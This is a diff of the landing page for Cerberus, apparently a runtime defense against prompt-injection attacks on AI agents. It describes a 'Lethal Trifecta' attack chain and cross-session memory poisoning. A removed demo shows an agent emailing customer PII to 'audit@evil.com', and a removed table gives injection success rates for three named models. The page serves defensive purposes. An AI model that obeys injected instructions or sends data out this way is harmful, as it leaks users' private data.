+    tr:hover td { background: rgba(255,255,255,0.015); }
 
-    .pct-high { color: var(--red); font-weight: 700; }
-    .pct-low  { color: var(--green); }
-    .pct-med  { color: var(--text); }
+    .pct-high { color: var(--red-bright); font-weight: 700; }
+    .pct-low  { color: var(--emerald); font-weight: 600; }
+    .pct-med  { color: var(--text-2); }
+    .mono { font-family: var(--mono); font-size: 0.78rem; }
 
-    /* ── Code block ──────────────────────────────────────────────────────── */
-    .code-block {
-      background: #0d1117;
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      overflow: hidden;
-    }
-
-    .code-header {
-      background: #161b22;
-      padding: 0.5rem 1rem;
-      font-family: var(--mono);
-      font-size: 0.75rem;
-      color: var(--muted);
-      border-bottom: 1px solid var(--border);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    pre {
-      padding: 1.25rem 1.5rem;
-      font-family: var(--mono);
-      font-size: 0.8rem;
-      line-height: 1.7;
+    /* ── Enterprise / Comparison Table ─────────────────────────────────────── */
+    .compare-wrap {
       overflow-x: auto;
-      color: var(--text-dim);
+      margin: 2.5rem 0;
     }
 
-    .kw { color: #c084fc; }
-    .str { color: #4ade80; }
-    .cmt { color: var(--muted); }
-    .fn { color: #60a5fa; }
-    .num { color: #fb923c; }
-
-    /* ── Integrations ────────────────────────────────────────────────────── */
-    .integrations {
-      display: flex;
-      gap: 0.75rem;
-      flex-wrap: wrap;
+    .compare-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
     }
 
-    .integration-tag {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 0.4rem 0.9rem;
-      font-size: 0.8rem;
-      color: var(--text-dim);
-      font-family: var(--mono);
-    }
-
-    .integration-tag.supported { border-color: var(--green); color: var(--green); }
-
-    /* ── CTA section ─────────────────────────────────────────────────────── */
-    .cta-section {
+    .compare-table th {
       text-align: center;
-      border-top: 1px solid var(--border);
-      padding: 5rem 2rem;
+      padding: 1rem 1.25rem;
+      border-bottom: 2px solid var(--border-2);
+      color: var(--text-muted);
+      font-weight: 600;
+      font-size: 0.75rem;
+      letter-spacing: 0.05em;
     }
 
-    .cta-section h2 { margin-bottom: 0.75rem; }
-    .cta-section p { color: var(--text-dim); margin-bottom: 2rem; }
+    .compare-table th.col-feature {
+      text-align: left;
+      width: 44%;
+    }
 
-    /* ── Footer ──────────────────────────────────────────────────────────── */
-    footer {
-      border-top: 1px solid var(--border);
+    .compare-table th.col-enterprise {
+      background: rgba(59,130,246,0.06);
+      border-bottom-color: var(--blue);
+      color: var(--blue);
+    }
+
+    .compare-table td {
+      padding: 0.65rem 1.25rem;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-dim);
+    }
+
+    .compare-table td.col-enterprise {
+      background: rgba(59,130,246,0.03);
+      color: var(--blue);
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .compare-table td.col-oss { text-align: center; }
+
+    .compare-table tr.section-header td {
+      background: var(--surface-2);
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--text-2);
+      letter-spacing: 0.03em;
+      padding: 0.5rem 1.25rem;
+      border-bottom: 1px solid var(--border-2);
+    }
+
+    .compare-table tr.section-header td.col-enterprise {
+      background: rgba(59,130,246,0.05);
+    }
+
+    .compare-table tr:last-child td { border-bottom: none; }
+    .compare-table tr:hover td { background: rgba(255,255,255,0.012); }
+    .compare-table tr:hover td.col-enterprise { background: rgba(59,130,246,0.06); }
+
+    .check-yes { color: var(--emerald); font-weight: 700; font-size: 1rem; }
+    .check-no { color: var(--text-muted); }
+
+    /* ── Pricing Cards ──────────────────────────────────────────────────────── */
+    .pricing-cards {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 2rem;
+    }
+
+    .pricing-card {
+      background: var(--surface);
       padding: 2rem;
       display: flex;
+      flex-direction: column;
+    }
+
+    .pricing-card.featured {
+      background: linear-gradient(180deg, rgba(59,130,246,0.06) 0%, var(--surface) 100%);
+      position: relative;
+    }
+
+    .pricing-badge {
+      display: inline-block;
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 0.2rem 0.6rem;
+      border-radius: 4px;
+      background: var(--blue);
+      color: #fff;
+      margin-bottom: 1rem;
+    }
+
+    .pricing-badge.red { background: var(--red); }
+    .pricing-badge.emerald { background: var(--emerald); }
+
+    .pricing-name {
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 0.5rem;
+    }
+
+    .pricing-price {
+      font-size: 2.4rem;
+      font-weight: 900;
+      letter-spacing: -0.04em;
+      color: #fff;
+      line-height: 1;
+      margin-bottom: 0.3rem;
+    }
+
+    .pricing-price sub {
+      font-size: 1rem;
+      font-weight: 400;
+      color: var(--text-dim);
+      vertical-align: baseline;
+    }
+
+    .pricing-period {
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      margin-bottom: 1.5rem;
+    }
+
+    .pricing-desc {
+      font-size: 0.875rem;
+      color: var(--text-dim);
+      margin-bottom: 1.75rem;
+      line-height: 1.6;
+      flex: 1;
+    }
+
+    .pricing-cta {
+      display: block;
+      text-align: center;
+      padding: 0.7rem 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      text-decoration: none;
+      transition: all 0.18s;
+      border: 1px solid var(--border-2);
+      color: var(--text-2);
+      background: transparent;
+    }
+
+    .pricing-cta:hover { background: rgba(255,255,255,0.04); color: #fff; text-decoration: none; border-color: #2d3550; }
+    .pricing-cta.primary { background: var(--blue); color: #fff; border-color: var(--blue); box-shadow: 0 0 20px var(--blue-glow); }
+    .pricing-cta.primary:hover { background: #2563eb; box-shadow: 0 0 28px rgba(59,130,246,0.4); }
+    .pricing-cta.red-btn { background: var(--red); color: #fff; border-color: var(--red); }
+    .pricing-cta.red-btn:hover { background: var(--red-bright); }
+
+    /* ── Final CTA Band ─────────────────────────────────────────────────────── */
+    .cta-band {
+      background: radial-gradient(ellipse 70% 80% at 50% 50%, rgba(220,38,38,0.1) 0%, transparent 70%),
+                  var(--bg-alt);
+      border-top: 1px solid var(--border);
+      padding: 6rem 2rem;
+      text-align: center;
+    }
+
+    .cta-band h2 { margin-bottom: 1rem; }
+    .cta-band p { color: var(--text-dim); margin-bottom: 2.5rem; font-size: 1.05rem; }
+    .cta-band-actions { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+
+    /* ── Footer ─────────────────────────────────────────────────────────────── */
+    footer {
+      background: #07080e;
+      border-top: 1px solid var(--border);
+      padding: 3.5rem 2rem 2rem;
+    }
+
+    .footer-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+    }
+
+    .footer-top {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1fr 1fr 1fr;
+      gap: 2rem;
+      padding-bottom: 3rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .footer-brand-name {
+      font-size: 1rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      color: #fff;
+      margin-bottom: 0.4rem;
+    }
+    .footer-brand-name span { color: var(--red); }
+
+    .footer-tagline {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-bottom: 1rem;
+      line-height: 1.5;
+    }
+
+    .footer-company {
+      font-size: 0.75rem;
+      color: #2a2a38;
+      font-family: var(--mono);
+    }
+
+    .footer-col-title {
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      margin-bottom: 1rem;
+    }
+
+    .footer-links {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .footer-links a {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .footer-links a:hover { color: var(--text-2); text-decoration: none; }
+
+    .footer-bottom {
+      padding-top: 1.5rem;
+      display: flex;
       align-items: center;
       justify-content: space-between;
-      flex-wrap: wrap;
       gap: 1rem;
+      flex-wrap: wrap;
     }
 
-    .footer-logo {
-      font-family: var(--mono);
-      font-size: 0.875rem;
-      color: var(--muted);
+    .footer-copy {
+      font-size: 0.75rem;
+      color: var(--text-muted);
     }
 
-    .footer-logo span { color: var(--red); }
+    .footer-legal {
+      display: flex;
+      gap: 1.5rem;
+    }
 
-    .footer-links { display: flex; gap: 1.5rem; }
-    .footer-links a { font-size: 0.8rem; color: var(--muted); }
-    .footer-links a:hover { color: var(--text); text-decoration: none; }
+    .footer-legal a {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .footer-legal a:hover { color: var(--text-2); text-decoration: none; }
 
-    /* ── Responsive ──────────────────────────────────────────────────────── */
+    /* ── Responsive ─────────────────────────────────────────────────────────── */
+    @media (max-width: 1024px) {
+      .hero-inner { grid-template-columns: 1fr; gap: 3rem; }
+      .hero-diagram { display: none; }
+      .code-section-inner { grid-template-columns: 1fr; gap: 2.5rem; }
+      .features-grid { grid-template-columns: repeat(2, 1fr); }
+      .pricing-cards { grid-template-columns: 1fr; }
+      .footer-top { grid-template-columns: 1fr 1fr; }
+      .stats-inner { grid-template-columns: repeat(2, 1fr); }
+      .stat-item { border-left: none; border-top: 1px solid var(--border); padding: 1rem 0; }
+      .stat-item:nth-child(odd) { border-left: none; }
+    }
+
+    @media (max-width: 768px) {
+      .threat-steps { grid-template-columns: 1fr; }
+      .pipeline { flex-direction: column; }
+      .pipeline-layer { border-radius: 0 !important; border-left: 1px solid var(--border-2) !important; }
+      .pipeline-layer:first-child { border-radius: 10px 10px 0 0 !important; }
+      .pipeline-layer:last-child { border-radius: 0 0 10px 10px !important; }
+      .pipeline-arrow { display: none; }
+      nav .nav-center { display: none; }
+      .footer-top { grid-template-columns: 1fr 1fr; }
+      .compare-table { font-size: 0.8rem; }
+    }
+
     @media (max-width: 640px) {
-      .chain { grid-template-columns: 1fr; }
-      .stats { gap: 1.5rem; }
-      .nav-links .hide-mobile { display: none; }
-      h1 { font-size: 2rem; }
+      .hero { padding: 5rem 1.25rem 4rem; }
+      .hero h1 { font-size: 2rem; }
+      .features-grid { grid-template-columns: 1fr; }
+      .section { padding: 4rem 1.25rem; }
+      .footer-top { grid-template-columns: 1fr; }
+      .stats-inner { grid-template-columns: 1fr 1fr; }
+      .company-banner { font-size: 0.6rem; }
     }
   </style>
 </head>
 <body>
 
-<!-- ── Company Banner ───────────────────────────────────────────────────── -->
-<div style="background:#07070C;border-bottom:1px solid #191921;padding:0 2rem;height:32px;display:flex;align-items:center;justify-content:space-between;font-size:0.7rem;letter-spacing:0.08em;font-family:'IBM Plex Mono',monospace">
-  <a href="https://www.sixsenseenterprise.com" style="color:#C4A96B;text-decoration:none;text-transform:uppercase">← Odingard Security</a>
-  <span style="color:#5C5C74;text-transform:uppercase">Six Sense Enterprise Services</span>
+<!-- ── Company Banner ──────────────────────────────────────────────────────── -->
+<div class="company-banner">
+  <a href="https://www.sixsenseenterprise.com">&#8592; Odingard Security</a>
+  <span class="company-banner-right">Six Sense Enterprise Services</span>
 </div>
 
-<!-- ── Nav ──────────────────────────────────────────────────────────────── -->
+<!-- ── Navigation ─────────────────────────────────────────────────────────── -->
 <nav>
-  <div class="nav-logo">
-    <div>cerberus<span>.</span></div>
-    <div style="font-size:0.55rem;color:#5C5C74;letter-spacing:0.1em;font-family:'IBM Plex Mono',monospace;text-transform:uppercase;margin-top:1px">by Odingard Security</div>
+  <a href="index.html" class="nav-logo">
+    <div class="nav-logo-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    </div>
+    <div class="nav-logo-text">CERBERUS<span>.</span></div>
+  </a>
+
+  <div class="nav-center">
+    <a href="#threat">How It Works</a>
+    <a href="#detection">Detection</a>
+    <a href="#integration">Integration</a>
+    <a href="#research">Research</a>
+    <a href="#enterprise">Enterprise</a>
   </div>
-  <div class="nav-links">
-    <a href="#how-it-works" class="hide-mobile">How It Works</a>
-    <a href="#research" class="hide-mobile">Research</a>
-    <a href="#quickstart" class="hide-mobile">Quickstart</a>
-    <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="hide-mobile">Live Demo</a>
-    <a href="https://github.com/Odingard/cerberus" class="hide-mobile">GitHub</a>
-    <a href="pricing.html" class="hide-mobile" style="color:var(--blue);font-weight:600">Enterprise</a>
-    <a href="https://www.sixsenseenterprise.com" class="hide-mobile" style="color:#C4A96B;font-size:0.8rem">← sixsenseenterprise.com</a>
-    <a href="https://www.npmjs.com/package/@cerberus-ai/core" class="nav-cta">npm install</a>
+
+  <div class="nav-right">
+    <a href="https://github.com/Odingard/cerberus" target="_blank">GitHub</a>
+    <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="nav-btn-demo">Live Demo &#8599;</a>
+    <a href="pricing.html" class="nav-btn-primary">Get Started &#8594;</a>
   </div>
 </nav>
 
-<!-- ── Hero ─────────────────────────────────────────────────────────────── -->
-<div class="hero">
-  <div class="badge">v1.0.0 — Agentic AI Runtime Security</div>
-  <h1>Your AI agents are being<br><em>weaponized against you</em></h1>
-  <p class="hero-sub">
-    Every AI agent that can read private data, process external content, and send outbound messages
-    is vulnerable to the same fundamental attack. Cerberus detects, correlates, and blocks it —
-    in real time, before data leaves your system.
-  </p>
-  <div class="hero-actions">
-    <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="btn btn-primary" style="background:var(--red);border-color:var(--red)">▶ Live Attack Demo</a>
-    <a href="#quickstart" class="btn btn-secondary">Get started in 5 min</a>
-    <a href="https://github.com/Odingard/cerberus" class="btn btn-secondary">GitHub</a>
-  </div>
-
-  <!-- Terminal demo -->
-  <div class="terminal-wrap">
-    <div class="terminal-bar">
-      <div class="dot dot-red"></div>
-      <div class="dot dot-yellow"></div>
-      <div class="dot dot-green"></div>
-      <span class="t-dim" style="font-size:0.75rem;font-family:var(--mono);margin-left:0.5rem">cerberus demo</span>
+<!-- ── Hero ───────────────────────────────────────────────────────────────── -->
+<section class="hero">
+  <div class="hero-inner">
+    <div class="hero-left">
+      <div class="hero-eyebrow">
+        <span class="hero-eyebrow-dot"></span>
+        AI Security Platform
+      </div>
+      <h1>Protect Your AI Agents<br>at <em>Runtime</em></h1>
+      <p class="hero-sub">
+        Every AI agent with privileged access, external content ingestion, and outbound messaging is vulnerable to the Lethal Trifecta. Cerberus detects, correlates, and blocks it — before data leaves your system.
+      </p>
+      <div class="hero-actions">
+        <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="btn btn-primary btn-pill">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><polygon points="5,3 19,12 5,21"/></svg>
+          See Live Demo
+        </a>
+        <a href="https://github.com/Odingard/cerberus/blob/main/docs/getting-started.md" target="_blank" class="btn btn-outline btn-pill">View Documentation</a>
+      </div>
     </div>
-    <div class="terminal-body">
-      <div><span class="t-dim">─── Phase 1: Unguarded ───────────────────────────────</span></div>
-      <div><span class="t-dim">→</span> <span class="t-cmd">readCustomerData</span><span class="t-dim">({})</span>     <span class="t-dim">← SSN, email, phone — 5 records</span></div>
-      <div><span class="t-dim">→</span> <span class="t-cmd">fetchWebpage</span><span class="t-dim">({url})</span>      <span class="t-dim">← injection payload embedded in page</span></div>
-      <div><span class="t-dim">→</span> <span class="t-cmd">sendEmail</span><span class="t-dim">({to: <span class="t-yellow">"audit@evil.com"</span>, body: &lt;PII&gt;})</span></div>
-      <div>&nbsp;</div>
-      <div><span class="t-red t-bold">⚠  EXFILTRATION CONFIRMED</span>  <span class="t-dim">1,202 bytes sent · $0.001 total cost</span></div>
-      <div>&nbsp;</div>
-      <div><span class="t-dim">─── Phase 2: Guarded ─────────────────────────────────</span></div>
-      <div><span class="t-dim">→</span> <span class="t-cmd">readCustomerData</span>  <span class="t-dim">[Cerberus] turn-000: score=</span><span class="t-yellow">1</span><span class="t-dim">/4 → ○</span></div>
-      <div><span class="t-dim">→</span> <span class="t-cmd">fetchWebpage</span>      <span class="t-dim">[Cerberus] turn-001: score=</span><span class="t-yellow">2</span><span class="t-dim">/4 → ○</span></div>
-      <div><span class="t-dim">→</span> <span class="t-cmd">sendEmail</span>         <span class="t-dim">[Cerberus] turn-002: score=</span><span class="t-red t-bold">3</span><span class="t-dim">/4 →</span> <span class="t-red t-bold">✗ BLOCKED</span></div>
-      <div>&nbsp;</div>
-      <div><span class="t-green t-bold">✓  EXFILTRATION BLOCKED</span>  <span class="t-dim">0 requests to capture server</span></div>
+
+    <div class="hero-diagram">
+      <div class="threat-diagram">
+        <div class="diagram-title">Lethal Trifecta — Live Block</div>
+
+        <div class="flow-row">
+          <div class="flow-node agent">AI Agent</div>
+          <div class="flow-arrow">&#8594;</div>
+          <div class="flow-node">readDatabase()</div>
+          <div class="flow-arrow">&#8594;</div>
+          <div class="flow-node" style="color:#fcd34d;border-color:#78350f">PII detected</div>
+        </div>
+
+        <div class="flow-row" style="margin-top:0.25rem">
+          <div class="flow-node agent">Agent</div>
+          <div class="flow-arrow">&#8594;</div>
+          <div class="flow-node">fetchWebpage()</div>
+          <div class="flow-arrow">&#8594;</div>
+          <div class="flow-node" style="color:#fcd34d;border-color:#78350f">Injection found</div>
+        </div>
+
+        <div class="flow-row" style="margin-top:0.25rem">
+          <div class="flow-node agent">Agent</div>
+          <div class="flow-arrow">&#8594;</div>
+          <div class="flow-node">sendEmail()</div>
+          <div class="flow-arrow">&#8594;</div>
+          <div class="flow-node blocked">BLOCKED</div>
+        </div>
+
+        <div class="shield-block">
+          <div class="shield-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+          </div>
+          <div class="shield-label">
+            <div class="shield-label-title">Cerberus Intercepted</div>
+            <div class="shield-label-sub">Exfiltration blocked — 0 bytes sent</div>
+          </div>
+          <div>
+            <div class="shield-score">3/4</div>
+            <div class="shield-score-label">risk score</div>
+          </div>
+        </div>
+
+        <div style="display:flex;align-items:center;gap:0.5rem;margin-bottom:0.5rem">
+          <div style="width:1px;flex:1;height:1px;background:var(--border-2)"></div>
+          <span style="font-size:0.65rem;color:var(--text-muted);font-family:var(--mono);text-transform:uppercase;letter-spacing:0.08em">Detection layers fired</span>
+          <div style="width:1px;flex:1;height:1px;background:var(--border-2)"></div>
+        </div>
+
+        <div class="layer-pills">
+          <span class="layer-pill l1">L1 Data Source</span>
+          <span class="layer-pill l2">L2 Injection</span>
+          <span class="layer-pill l3">L3 Outbound</span>
+          <span class="layer-pill l4">L4 Memory</span>
+          <span class="layer-pill blocked">INTERRUPTED</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ── Stats Strip ─────────────────────────────────────────────────────────── -->
+<div class="stats-strip">
+  <div class="stats-inner">
+    <div class="stat-item">
+      <div class="stat-num red">~100%</div>
+      <div class="stat-label">Attack success rate across<br>3 LLM providers (unguarded)</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">52&#956;s</div>
+      <div class="stat-label">Median detection overhead<br>— 0.01% of LLM latency</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num emerald">0%</div>
+      <div class="stat-label">False positive rate<br>on clean control runs</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-num">N=285</div>
+      <div class="stat-label">Real API calls validated<br>across OpenAI, Anthropic, Google</div>
     </div>
   </div>
 </div>
 
-<!-- ── Stats ─────────────────────────────────────────────────────────────── -->
-<div class="stats">
-  <div class="stat">
-    <div class="stat-num red">~100%</div>
-    <div class="stat-label">Attack success rate<br>across 3 LLM providers</div>
-  </div>
-  <div class="stat">
-    <div class="stat-num">N=285</div>
-    <div class="stat-label">Real API calls<br>scientifically validated</div>
-  </div>
-  <div class="stat">
-    <div class="stat-num">52μs</div>
-    <div class="stat-label">Detection overhead p50<br>0.01% of LLM latency</div>
-  </div>
-  <div class="stat">
-    <div class="stat-num">773</div>
-    <div class="stat-label">Tests<br>98%+ coverage</div>
-  </div>
-  <div class="stat">
-    <div class="stat-num">14</div>
-    <div class="stat-label">Attack scenarios<br>in live playground</div>
-  </div>
-  <div class="stat">
-    <div class="stat-num">0%</div>
-    <div class="stat-label">False positive rate<br>on clean control runs</div>
-  </div>
-</div>
+<div class="section-divider"></div>
 
-<!-- ── How It Works ──────────────────────────────────────────────────────── -->
-<section id="how-it-works">
-  <h2>The <em>Lethal Trifecta</em></h2>
-  <p class="section-sub">
-    Every AI agent with three capabilities is exploitable. The attack is reproducible today
-    with free-tier API access and three function calls.
-  </p>
+<!-- ── Threat Section ──────────────────────────────────────────────────────── -->
+<section class="section" id="threat">
+  <div class="section-inner">
+    <div class="section-label">The Problem</div>
+    <h2>The <em>Lethal Trifecta</em></h2>
+    <p class="section-sub">
+      Every AI agent with three common capabilities is exploitable today — with free API access and three tool calls. The attack is reproducible, scalable, and invisible to conventional security tools.
+    </p>
 
-  <div class="chain">
-    <div class="chain-step">
-      <div class="chain-num">Layer 1 — L1</div>
-      <div class="chain-title">Privileged Access</div>
-      <div class="chain-desc">Agent reads sensitive data — CRM records, PII, internal documents, credentials.</div>
+    <div class="threat-steps">
+      <div class="threat-step">
+        <div class="threat-step-num">
+          <div class="threat-step-num-badge">1</div>
+          Layer 1 &mdash; L1
+        </div>
+        <div class="threat-step-title">Privileged Data Access</div>
+        <div class="threat-step-desc">
+          The agent reads sensitive data from internal systems — CRM records, customer PII, credentials, financial data, or proprietary documents. Standard enterprise AI workflows.
+        </div>
+        <span class="threat-step-tag">DATA SOURCE CLASSIFICATION</span>
+      </div>
+      <div class="threat-step">
+        <div class="threat-step-num">
+          <div class="threat-step-num-badge">2</div>
+          Layer 2 &mdash; L2
+        </div>
+        <div class="threat-step-title">Prompt Injection</div>
+        <div class="threat-step-desc">
+          A hidden instruction embedded in external content — a webpage, email, document, or API response — redirects the agent's behavior. The agent follows attacker instructions without knowing it.
+        </div>
+        <span class="threat-step-tag">TOKEN PROVENANCE &amp; INJECTION</span>
+      </div>
+      <div class="threat-step">
+        <div class="threat-step-num">
+          <div class="threat-step-num-badge">3</div>
+          Layer 3 &mdash; L3
+        </div>
+        <div class="threat-step-title">Data Exfiltration</div>
+        <div class="threat-step-desc">
+          The agent sends private data to an attacker-controlled endpoint — disguised as a legitimate email, webhook call, or API request. Data exits your perimeter silently.
+        </div>
+        <span class="threat-step-tag">OUTBOUND INTENT ANALYSIS</span>
+      </div>
     </div>
-    <div class="chain-step">
-      <div class="chain-num">Layer 2 — L2</div>
-      <div class="chain-title">Injection</div>
-      <div class="chain-desc">External content manipulates the agent's behavior — a hidden instruction in a webpage, email, or document.</div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">Layer 3 — L3</div>
-      <div class="chain-title">Exfiltration</div>
-      <div class="chain-desc">Agent sends private data to an attacker-controlled endpoint — email, webhook, API call.</div>
-    </div>
-  </div>
 
-  <p style="color:var(--text-dim);font-size:0.875rem;">
-    When all three fire in the same session, Cerberus scores the session at <strong style="color:var(--red)">3/4</strong>
-    and interrupts the outbound call — before data leaves your system.
-    <br><br>
-    <strong>Layer 4 (novel):</strong> Cross-session memory contamination — an attacker injects a payload into Session 1 that triggers exfiltration in Session 3. No existing tool detects this. Cerberus ships the first deployable defense.
-  </p>
-</section>
-
-<!-- ── Features ──────────────────────────────────────────────────────────── -->
-<section>
-  <h2>One function call. <em>Full coverage.</em></h2>
-  <p class="section-sub">Cerberus wraps your existing tool executors. No agent framework changes. No model swaps.</p>
-
-  <div class="features">
-    <div class="feature">
-      <div class="feature-icon">🔍</div>
-      <div class="feature-title">4 Detection Layers</div>
-      <div class="feature-desc">L1 data source classification, L2 token provenance, L3 outbound intent, L4 memory contamination — all feeding one correlation engine.</div>
-    </div>
-    <div class="feature">
-      <div class="feature-icon">🧬</div>
-      <div class="feature-title">7 Sub-Classifiers</div>
-      <div class="feature-desc">Secrets detector, injection scanner, encoding detector, MCP poisoning scanner, domain classifier, outbound correlator, behavioral drift detector.</div>
-    </div>
-    <div class="feature">
-      <div class="feature-icon">📡</div>
-      <div class="feature-title">OpenTelemetry Built-In</div>
-      <div class="feature-desc">One span + 3 metrics per tool call. Plug into Grafana, Datadog, Honeycomb, Jaeger — any OTel backend. Zero overhead when disabled.</div>
-    </div>
-    <div class="feature">
-      <div class="feature-icon">🌐</div>
-      <div class="feature-title">HTTP Proxy Mode</div>
-      <div class="feature-desc">Zero code changes. Run Cerberus as a gateway. Agent routes tool calls to POST /tool/:toolName — detection is transparent.</div>
-    </div>
-    <div class="feature">
-      <div class="feature-icon">🔌</div>
-      <div class="feature-title">Framework Adapters</div>
-      <div class="feature-desc">Native support for LangChain, Vercel AI SDK, and OpenAI Agents SDK out of the box.</div>
-    </div>
-    <div class="feature">
-      <div class="feature-icon">📊</div>
-      <div class="feature-title">Grafana Dashboard</div>
-      <div class="feature-desc">Pre-built dashboard with 14 panels. One command: docker compose -f monitoring/docker-compose.yml up -d</div>
+    <div class="trifecta-note">
+      <strong>When all three fire in the same session,</strong> Cerberus scores the session at <span class="highlight">3/4</span> and interrupts the outbound call — before a single byte leaves your system. No rule writing. No signature updates.
+      <br><br>
+      <strong>Layer 4 (novel defense):</strong> Cross-session memory contamination — an attacker injects a payload into Session 1 that triggers exfiltration in Session 3. No existing security tool detects this. Cerberus ships the <strong>first deployable runtime defense</strong> against this attack vector.
     </div>
   </div>
 </section>
 
-<!-- ── Research ───────────────────────────────────────────────────────────── -->
-<section id="research">
-  <h2>Validated at <em>scale</em></h2>
-  <p class="section-sub">
-    N=285 real API calls. 30 payloads × 3 trials × 3 providers. Wilson 95% confidence intervals.
-    6-factor causation scoring. 5 negative control runs per provider — 0 false exfiltrations.
-  </p>
+<div class="section-divider"></div>
 
-  <div class="table-wrap" style="margin-bottom:1.5rem;">
-    <table>
-      <thead>
-        <tr>
-          <th>Provider</th>
-          <th>Model</th>
-          <th>Any Exfiltration</th>
-          <th>Full Injection Compliance</th>
-          <th>95% CI</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>OpenAI</td>
-          <td style="font-family:var(--mono);font-size:0.78rem;">gpt-4o-mini</td>
-          <td class="pct-high">100% (90/90)</td>
-          <td class="pct-med">17.8% (16/90)</td>
-          <td class="t-dim" style="font-size:0.78rem;">[11.2%, 26.9%]</td>
-        </tr>
-        <tr>
-          <td>Anthropic</td>
-          <td style="font-family:var(--mono);font-size:0.78rem;">claude-sonnet-4</td>
-          <td class="pct-high">100% (90/90)</td>
-          <td class="pct-low">2.2% (2/90)</td>
-          <td class="t-dim" style="font-size:0.78rem;">[0.6%, 7.7%]</td>
-        </tr>
-        <tr>
-          <td>Google</td>
-          <td style="font-family:var(--mono);font-size:0.78rem;">gemini-2.5-flash</td>
-          <td class="pct-high">98.9% (89/90)</td>
-          <td class="pct-high">48.9% (44/90)</td>
-          <td class="t-dim" style="font-size:0.78rem;">[38.8%, 59.0%]</td>
-        </tr>
-      </tbody>
-    </table>
+<!-- ── How Cerberus Works ───────────────────────────────────────────────────── -->
+<section class="section section-alt" id="detection">
+  <div class="section-inner">
+    <div class="section-label blue">How Cerberus Works</div>
+    <h2>Four-layer detection.<br><em class="blue">One correlation engine.</em></h2>
+    <p class="section-sub">
+      Every tool call flows through a sequential detection pipeline. Each layer fires independently. The correlation engine aggregates signals into a 4-bit risk vector and takes action.
+    </p>
+
+    <div class="pipeline">
+      <div class="pipeline-layer">
+        <div class="pipeline-layer-label l1">L1 — Data Source</div>
+        <div class="pipeline-layer-title">PII &amp; Secret Detection</div>
+        <div class="pipeline-layer-sub">Classifies what data the agent touched — PII, credentials, financial records. Seeds the risk vector.</div>
+      </div>
+      <div class="pipeline-arrow">&#8250;</div>
+      <div class="pipeline-layer">
+        <div class="pipeline-layer-label l2">L2 — Token Provenance</div>
+        <div class="pipeline-layer-title">Injection &amp; MCP Scanning</div>
+        <div class="pipeline-layer-sub">Detects injection patterns, encoding obfuscation, and MCP tool poisoning in tool responses.</div>
+      </div>
+      <div class="pipeline-arrow">&#8250;</div>
+      <div class="pipeline-layer">
+        <div class="pipeline-layer-label l3">L3 — Outbound Intent</div>
+        <div class="pipeline-layer-title">Exfiltration Detection</div>
+        <div class="pipeline-layer-sub">Analyzes outbound destinations, domain reputation, correlation with upstream injection signals.</div>
+      </div>
+      <div class="pipeline-arrow">&#8250;</div>
+      <div class="pipeline-layer">
+        <div class="pipeline-layer-label l4">L4 — Memory Guard</div>
+        <div class="pipeline-layer-title">Cross-Session Drift</div>
+        <div class="pipeline-layer-sub">Tracks behavioral drift across sessions. Detects multi-session memory contamination attacks.</div>
+      </div>
+      <div class="pipeline-arrow">&#8250;</div>
+      <div class="pipeline-layer" style="background:rgba(220,38,38,0.06);border-color:rgba(220,38,38,0.25)">
+        <div class="pipeline-layer-label" style="color:#fca5a5">CORRELATION ENGINE</div>
+        <div class="pipeline-layer-title">Risk Score &rarr; Action</div>
+        <div class="pipeline-layer-sub">4-bit vector &rarr; score 0&ndash;4 &rarr; log / alert / interrupt. Configurable thresholds.</div>
+      </div>
+    </div>
   </div>
-
-  <div class="table-wrap">
-    <table>
-      <thead>
-        <tr>
-          <th>Provider</th>
-          <th>Detection Rate</th>
-          <th>False Positive Rate</th>
-          <th>L1 Accuracy</th>
-          <th>L2 Accuracy</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
